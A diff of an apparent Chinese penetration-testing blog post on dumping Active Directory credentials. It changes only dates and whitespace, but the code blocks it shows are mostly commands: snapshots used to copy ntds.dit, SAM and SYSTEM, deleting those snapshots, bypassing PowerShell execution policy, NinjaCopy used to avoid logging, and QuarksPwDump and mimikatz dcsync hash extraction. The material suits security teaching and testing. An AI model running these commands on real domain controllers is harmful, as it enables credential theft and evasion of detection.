@@ -41,7 +41,7 @@
 <meta property="og:image" content="http://onlycare.github.io/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/10.png">
 <meta property="og:image" content="http://onlycare.github.io/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/11.png">
 <meta property="article:published_time" content="2021-02-28T06:41:22.000Z">
-<meta property="article:modified_time" content="2021-02-28T07:09:18.585Z">
+<meta property="article:modified_time" content="2021-03-14T16:42:16.357Z">
 <meta property="article:author" content="成殇Orz1">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="信息收集">
@@ -235,10 +235,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-02-28 14:41:22 / 修改时间：15:09:18" itemprop="dateCreated datePublished" datetime="2021-02-28T14:41:22+08:00">2021-02-28</time>
+              <time title="创建时间：2021-02-28 14:41:22" itemprop="dateCreated datePublished" datetime="2021-02-28T14:41:22+08:00">2021-02-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-15 00:42:16" itemprop="dateModified" datetime="2021-03-15T00:42:16+08:00">2021-03-15</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -303,10 +309,10 @@
 <li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间 无法确定 </li>
 <li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
 </ul>
-<h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><h5 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line"><span class="built_in">mount</span> [<span class="type">GUID</span>]	//<span class="built_in">copy</span> 完之后再执行</span><br><span class="line">unmout [<span class="type">GUID</span>]</span><br><span class="line"><span class="built_in">del</span> [<span class="type">GUID</span>]</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><h5 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line"><span class="built_in">mount</span> [<span class="type">GUID</span>]			//<span class="built_in">copy</span> 完之后再执行</span><br><span class="line">unmout [<span class="type">GUID</span>]</span><br><span class="line"><span class="built_in">del</span> [<span class="type">GUID</span>]</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.png"></p>
-<h5 id="非交互式"><a href="#非交互式" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit				//创建快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit								//挂载快照</span><br><span class="line"><span class="built_in">copy</span> MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit					//复制ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit			//删除快照</span><br></pre></td></tr></table></figure>
+<h5 id="非交互式"><a href="#非交互式" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit		//创建快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit				//挂载快照</span><br><span class="line"><span class="built_in">copy</span> MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit			//复制ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit		//删除快照</span><br></pre></td></tr></table></figure>
 
 
 
@@ -317,7 +323,7 @@
 
 
 
-<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows													//查询当前系统的快照</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:											//创建快照</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds2.dit		//复制文件</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet									//删除快照</span><br><span class="line">vssadmin delete Shadows /All /quie										//删除快照</span><br></pre></td></tr></table></figure>
+<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows										//查询当前系统的快照</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:									//创建快照</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds2.dit		//复制文件</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet								//删除快照</span><br><span class="line">vssadmin delete Shadows /All /quie								//删除快照</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.png"></p>
 <h5 id="mklink"><a href="#mklink" class="headerlink" title="mklink"></a>mklink</h5><p>无法直接访问 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23中的文件 </p>
@@ -327,13 +333,13 @@
 
 
 <h4 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h4><p>Vshadow：是一个简单的指令行工具，它允许任何人创建卷影拷贝。系统默认不支持，可在<code>Microsoft Windows Software Development Kit (SDK)</code>中获得该工具。（不会被杀软杀）</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe <span class="literal">-q</span>											//查询当前快照</span><br><span class="line">vshadow.exe <span class="literal">-p</span> <span class="literal">-nw</span> C:									//创建快照</span><br><span class="line"><span class="built_in">copy</span> [<span class="type">Shadow</span> <span class="type">copy</span> <span class="type">device</span> <span class="type">name</span>]\windows\ntds\ntds.dit c:\ntds.dit	//复制</span><br><span class="line">vshadow.exe <span class="literal">-dx</span>=ShadowCopySetId							//删除</span><br><span class="line">vshadow.exe <span class="literal">-ds</span>=ShadowCopyId</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe <span class="literal">-q</span>								//查询当前快照</span><br><span class="line">vshadow.exe <span class="literal">-p</span> <span class="literal">-nw</span> C:							//创建快照</span><br><span class="line"><span class="built_in">copy</span> [<span class="type">Shadow</span> <span class="type">copy</span> <span class="type">device</span> <span class="type">name</span>]\windows\ntds\ntds.dit c:\ntds.dit	//复制</span><br><span class="line">vshadow.exe <span class="literal">-dx</span>=ShadowCopySetId						//删除</span><br><span class="line">vshadow.exe <span class="literal">-ds</span>=ShadowCopyId</span><br></pre></td></tr></table></figure>
 
 <h5 id="查询快照"><a href="#查询快照" class="headerlink" title="查询快照"></a>查询快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.png"></p>
 <h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.png"></p>
 <h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.png"></p>
 <h4 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h4><p>通过NinjaCopy获得域控服务器NTDS.dit文件,没有调用Volume Shadow Copy服务，所以不会产生日志文件7036。</p>
-<h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> Bypass							//修改powershell执行策略</span><br></pre></td></tr></table></figure>
+<h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> Bypass			//修改powershell执行策略</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure>
 
@@ -344,7 +350,7 @@
 
 
 
-<h3 id="0x02-解密ntds-dit"><a href="#0x02-解密ntds-dit" class="headerlink" title="0x02 解密ntds.dit"></a>0x02 解密ntds.dit</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit										//修复复制出来的数据库文件</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-解密ntds-dit"><a href="#0x02-解密ntds-dit" class="headerlink" title="0x02 解密ntds.dit"></a>0x02 解密ntds.dit</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit			//修复复制出来的数据库文件</span><br></pre></td></tr></table></figure>
 
 <h4 id="QuarkPwDump"><a href="#QuarkPwDump" class="headerlink" title="QuarkPwDump"></a>QuarkPwDump</h4><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的 用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -<span class="literal">-dump</span><span class="literal">-hash</span><span class="literal">-domain</span> -<span class="literal">-output</span> de1ay.com.txt -<span class="literal">-ntds</span><span class="operator">-file</span> ntds.dit</span><br></pre></td></tr></table></figure>
@@ -359,7 +365,7 @@
 
 <p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/10.png"></p>
 <h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>使用Mimikatz的<code>dcsync</code>功能，可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:de1ay.com /user:mssql			//获取单个用户的详细信息</span><br><span class="line">lsadump::dcsync /domain:de1ay.com /all /cvs				//获取所有用户</span><br><span class="line">mimikatz lsadump::lsa /inject							//查看所有用户的详细信息</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:de1ay.com /user:mssql			//获取单个用户的详细信息</span><br><span class="line">lsadump::dcsync /domain:de1ay.com /all /cvs			//获取所有用户</span><br><span class="line">mimikatz lsadump::lsa /inject					//查看所有用户的详细信息</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/11.png"></p>
 
